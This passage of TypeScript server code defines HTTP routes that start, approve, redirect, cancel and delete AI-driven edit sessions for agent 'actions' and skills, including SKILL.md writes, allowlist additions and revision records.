      // Pre-populate actionName so the pending-new card shows the user's chosen
      // name immediately instead of "(naming…)". The skill can still override if it
      // chooses a different one in its proposal.
      actionName: proposedName || null,
      sessionId,
      status: 'editing',
      startedAt: Date.now(),
      feedback,
    };
    setEdit(editKey(edit.actionName, sessionId), edit);
    res.statusCode = 200; res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({ sessionId, actionName: proposedName || null }));
  });

  // Starts or reuses the meta.build-action edit session for `name`. Extracted from
  // POST /api/actions/:name/edit so the denial-verdict route's `fix-action` goes through the
  // exact same path — a second spawn site would drift from this one's reuse handling and leave
  // two builder sessions racing on one SKILL.md.
  function startActionEdit(
    name: string, feedback: string,
  ): { ok: true; sessionId: string; reused?: boolean } | { ok: false; status: number; error: string } {
    if (!name) return { ok: false, status: 400, error: 'missing name' };
    let dir: string;
    try { ({ dir } = actionDirFor(outpostActionsDir, name)); }
    catch (e) { return { ok: false, status: 400, error: `invalid action name: ${(e as Error).message}` }; }
    try { if (!lstatSync(dir).isDirectory()) throw new Error('not a dir'); }
    catch { return { ok: false, status: 404, error: 'no such action' }; }
    const key = editKey(name, '');

    // If an edit is already running for this action, treat this as proposal-feedback —
    // forward the message to the same session, clear any prior proposal, and reuse it.
    const existing = actionEdits.get(key);
    if (existing) {
      const hadProposal = !!existing.proposal;
      noteRejected(existing, feedback);
      existing.feedback = feedback;
      existing.status = 'editing';
      existing.proposal = undefined;
      setEdit(key, existing);
      redraft(existing, hadProposal);
      const followup = feedback
        ? `Replacement feedback from the user:\n\n${feedback}\n\nRe-read $OUTPOST_ENVELOPE (skill_md_before may be stale if you already applied a draft) and post a new proposal.`
        : 'Replan with no new feedback — refresh the proposal.';
      manager.sendOrResume(existing.sessionId, dir, { type: 'user', message: { role: 'user', content: followup } }, actionEditEnv(existing.sessionId, join(RUNTIME_DIR, 'action-edits', existing.sessionId, 'envelope.json'), name));
      return { ok: true, sessionId: existing.sessionId, reused: true };
    }

    const sessionId = randomUUID();
    const skillMdBefore = readSkillMd(dir);
    const envelope = {
      kind: 'action-edit',
      mode: 'edit' as const,
      actionName: name,
      actionDir: dir,
      skillMdBefore,
      currentAllowlist: actionsStore.get(name).allowlist,
      userFeedback: feedback,
      proposalRoute: '/work/action-proposal',
    };
    const envelopePath = writeActionEnvelope(sessionId, envelope);
    manager.spawnDetached(sessionId, dir, actionEditEnv(sessionId, envelopePath, name), 'default');
    manager.tagKind(sessionId, 'action-edit');
    engine.bindAction(sessionId, 'meta.build-action');
    actionRunLedger.openExternal({ action: 'meta.build-action', round: 'draft', sessionId });
    engine.stampActionSession(sessionId, 'meta.build-action', `Edit action: ${name}`);
    manager.send(sessionId, { type: 'user', message: { role: 'user', content: '/meta.build-action' } });
    setEdit(key, {
      actionName: name,
      sessionId,
      status: 'editing',
      startedAt: Date.now(),
      feedback,
    });
    return { ok: true, sessionId };
  }

  server.route('POST', '/api/actions/:name/edit', async (req, res) => {
    const parts = (req.url ?? '').split('?')[0]!.split('/');
    const name = decodeURIComponent(parts[parts.length - 2] ?? '');
    const payload = await readJsonBody<{ feedback?: string }>(req);
    const started = startActionEdit(name, (payload?.feedback ?? '').trim());
    if (!started.ok) { res.statusCode = started.status; res.end(started.error); return; }
    res.statusCode = 200; res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({ sessionId: started.sessionId, ...(started.reused ? { reused: true } : {}) }));
  });

  // Approve the pending proposal: write SKILL.md, add allowlist rules, close session.
  // Keyed by sessionId so the "new action" flow (no name at first) works the same.
  server.route('POST', '/api/action-edits/:sessionId/approve', async (req, res) => {
    const parts = (req.url ?? '').split('?')[0]!.split('/');
    const sessionId = decodeURIComponent(parts[parts.length - 2] ?? '');
    if (!sessionId) { res.statusCode = 400; res.end('missing sessionId'); return; }
    const located = findEditBySession(sessionId);
    if (!located || !located.edit.proposal) { res.statusCode = 404; res.end('no pending proposal'); return; }
    const { key, edit } = located;
    const proposal = edit.proposal;
    const name = edit.actionName;
    if (!proposal) { res.statusCode = 404; res.end('no pending proposal'); return; }
    if (!name) { res.statusCode = 400; res.end('proposal has no action name'); return; }
    let dir: string;
    try { ({ dir } = actionDirFor(outpostActionsDir, name)); }
    catch (e) { res.statusCode = 400; res.end(`invalid action name: ${(e as Error).message}`); return; }
    const payload = await readJsonBody<{ actor?: string }>(req);
    // Provenance, not authentication — the PWA server is already trusted on the tailnet.
    // The edit itself knows who authored it (the improver's is registered as such at spawn),
    // so `actor` is only a manual override for callers that have no edit row to speak for them.
    const author: ActionAuthor = edit.author ?? (payload?.actor === 'improver' ? 'improver' : 'user');
    try {
      // Rules land before the write so the revision can record exactly which ones were new:
      // addRule answers false for a duplicate, and only genuinely-new rules are safe for a
      // later revert to remove.
      const allowlistAdds = applyAllowlistAdds(actionsStore, author, name, proposal.allowlistAdds);
      actionRevisionsStore.applyWrite({
        action: name,
        dir,
        body: proposal.skillMdAfter,
        author,
        allowlistAdds,
        rationale: proposal.summary,
        sessionId: edit.sessionId,
      });
      // The proposal only carries SKILL.md, but the registry requires input/output
      // schemas to load an action. Seed permissive defaults for a brand-new action;
      // never clobber an existing action's schemas on edit.
      const defaultSchema = JSON.stringify({ type: 'object' }, null, 2) + '\n';
      for (const f of ['input.schema.json', 'output.schema.json']) {
        const p = join(dir, f);
        if (!existsSync(p)) writeFileSync(p, defaultSchema);
      }
    } catch (e) {
      res.statusCode = 500; res.end(`apply failed: ${(e as Error).message}`); return;
    }
    edit.status = 'applying';
    setEdit(key, edit);
    notifyRevised(name);
    actionRunLedger.closeExternal(edit.sessionId, 'submitted');
    actionRunLedger.verdictExternal(edit.sessionId, 'accepted');
    void manager.close(edit.sessionId).catch(() => { /* tolerate */ });
    // Re-symlink into ~/.claude/skills, then reload the registry so the new action
    // reaches the catalog in the same actions_changed broadcast clearEdit fires —
    // otherwise the detail pane, still selected on this name, renders "Skill not found".
    try { ensureActionsInstalled(bundledRepoDir(SRC_DIR), RUNTIME_DIR); } catch { /* tolerate */ }
    try { actionRegistry.load(); } catch (e) { console.warn(`[action-edit] registry reload failed: ${(e as Error).message}`); }
    clearEdit(key);
    res.statusCode = 200; res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({ ok: true, actionName: name }));
  });

  // User submits new feedback on the active edit (with or without a posted proposal):
  // clear any proposal, send the feedback to the same session so it drafts again.
  server.route('POST', '/api/action-edits/:sessionId/proposal-feedback', async (req, res) => {
    const parts = (req.url ?? '').split('?')[0]!.split('/');
    const sessionId = decodeURIComponent(parts[parts.length - 2] ?? '');
    if (!sessionId) { res.statusCode = 400; res.end('missing sessionId'); return; }
    const located = findEditBySession(sessionId);
    if (!located) { res.statusCode = 404; res.end('no active edit'); return; }
    const { key, edit } = located;
    const payload = await readJsonBody<{ feedback?: string }>(req);
    const feedback = (payload?.feedback ?? '').trim();
    if (!feedback) { res.statusCode = 400; res.end('feedback required'); return; }
    const hadProposal = !!edit.proposal;
    noteRejected(edit, feedback);
    edit.feedback = feedback;
    edit.status = 'editing';
    edit.proposal = undefined;
    setEdit(key, edit);
    redraft(edit, hadProposal);
    const cwd = edit.actionName ? join(outpostActionsDir, edit.actionName) : outpostActionsDir;
    const followup = `Replacement feedback from the user:\n\n${feedback}\n\nDraft a new proposal that addresses this, then POST it again.`;
    manager.sendOrResume(
      edit.sessionId, cwd,
      { type: 'user', message: { role: 'user', content: followup } },
      actionEditEnv(edit.sessionId, join(RUNTIME_DIR, 'action-edits', edit.sessionId, 'envelope.json'), edit.actionName),
    );
    res.statusCode = 200; res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({ ok: true }));
  });

  // Cancel: kill the session, drop the pending proposal.
  server.route('POST', '/api/action-edits/:sessionId/cancel', async (req, res) => {
    const parts = (req.url ?? '').split('?')[0]!.split('/');
    const sessionId = decodeURIComponent(parts[parts.length - 2] ?? '');
    if (!sessionId) { res.statusCode = 400; res.end('missing sessionId'); return; }
    const located = findEditBySession(sessionId);
    if (located) {
      noteRejected(located.edit, '');
      void manager.close(located.edit.sessionId).catch(() => { /* tolerate */ });
      actionRunLedger.closeExternal(located.edit.sessionId, 'abandoned');
      clearEdit(located.key);
    }
    res.statusCode = 204; res.end();
  });

  server.route('POST', '/api/skills/new', async (req, res) => {
    const skillsDir = join(homedir(), '.claude', 'skills');
    mkdirSync(skillsDir, { recursive: true });
    const payload = await readJsonBody<{ feedback?: string }>(req);
    const feedback = (payload?.feedback ?? '').trim();
    const sections: string[] = [];
    if (feedback) sections.push(`User intent for this new skill:\n${feedback}`);
    sections.push('/skill-creator');
    const id = spawnEditSession('skill-edit', skillsDir, sections.join('\n\n'));
    res.statusCode = 200; res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({ sessionId: id }));
  });

  server.route('POST', '/api/skills/:name/edit', async (req, res) => {
    const parts = (req.url ?? '').split('?')[0]!.split('/');
    const name = decodeURIComponent(parts[parts.length - 2] ?? '');
    if (!name) { res.statusCode = 400; res.end('missing name'); return; }
    const skillDir = join(homedir(), '.claude', 'skills', name);
    let real: string;
    try { real = realpathSync(skillDir); }
    catch { res.statusCode = 404; res.end('no such skill'); return; }
    if (real.startsWith(outpostActionsDir)) {
      res.statusCode = 400; res.end('use /api/actions/:name/edit for actions'); return;
    }
    if (real.includes('/.claude/plugins/cache/')) {
      res.statusCode = 400; res.end('plugin-cache skills are read-only'); return;
    }
    const payload = await readJsonBody<{ feedback?: string }>(req);
    const feedback = (payload?.feedback ?? '').trim();
    const sections: string[] = [`You are editing the existing skill "${name}" in cwd.`];
    if (feedback) sections.push(`User feedback for this revision:\n${feedback}`);
    sections.push('/skill-creator');
    const id = spawnEditSession('skill-edit', real, sections.join('\n\n'));
    res.statusCode = 200; res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({ sessionId: id }));
  });

  server.route('DELETE', '/api/actions/:name', async (req, res) => {
    const name = decodeURIComponent((req.url ?? '').split('?')[0]!.split('/').pop()!);
    // includes('/')/'..' rejected up front as defense-in-depth; actionDirFor re-validates.
    if (!name || name.includes('/') || name.includes('..')) {
      res.statusCode = 400; res.end('invalid name'); return;
    }
    let dir: string;
    try { ({ dir } = actionDirFor(outpostActionsDir, name)); }
    catch (e) { res.statusCode = 400; res.end(`invalid action name: ${(e as Error).message}`); return; }
    const link = join(homedir(), '.claude', 'skills', name);
    actionRevisionsStore.noteDeleted(name, dir);
    try { rmSync(dir, { recursive: true, force: true }); } catch { /* tolerate */ }
    try {
      const st = lstatSync(link);
      if (st.isSymbolicLink()) unlinkSync(link);
    } catch { /* tolerate missing */ }
    actionsStore.deleteAction(name);
    // Reload the registry + broadcast so the removed action leaves the catalog.
    try { actionRegistry.load(); } catch (e) { console.warn(`[action-delete] registry reload failed: ${(e as Error).message}`); }
    try { notifyAll({ type: 'actions_changed' }); } catch { /* tolerate */ }
    res.statusCode = 200;
    res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({ ok: true }));
  });

  function dropEditForSession(sessionId: string): void {
    const located = findEditBySession(sessionId);
    if (!located) return;
    const { keep, outcome } = onSessionGone(located.edit);
    actionRunLedger.closeExternal(sessionId, outcome);
    // A posted proposal outlives its session — see onSessionGone. Approve tolerates a dead
    // session and proposal-feedback resumes one, so the card stays reviewable.
    if (keep) return;
    noteRejected(located.edit, '', 'system');
    clearEdit(located.key);
  }

  const beginImproverEdit: ActionsRoutesHandlers['beginImproverEdit'] = ({ sessionId, actionName }) => {
    // Keyed `a:<name>` like a user edit, which is what stops the improver and the user from
    // both holding an edit on one action — and what the selector reads to skip it.
    setEdit(editKey(actionName, sessionId), {
      actionName,
      sessionId,
      status: 'editing',
      startedAt: Date.now(),
      feedback: '',
      authorAction: 'meta.improve-actions',
      author: 'improver',
    });
    actionRunLedger.openExternal({ action: 'meta.improve-actions', round: 'review', sessionId });
  };

  const listPendingEdits: ActionsRoutesHandlers['listPendingEdits'] = () =>
    Array.from(actionEdits.values()).map((e) => ({ actionName: e.actionName, authorAction: e.authorAction }));

  return {
    recordActionDenial, onActionProposalHandler, dropEditForSession,
    beginImproverEdit, listPendingEdits,
  };
}
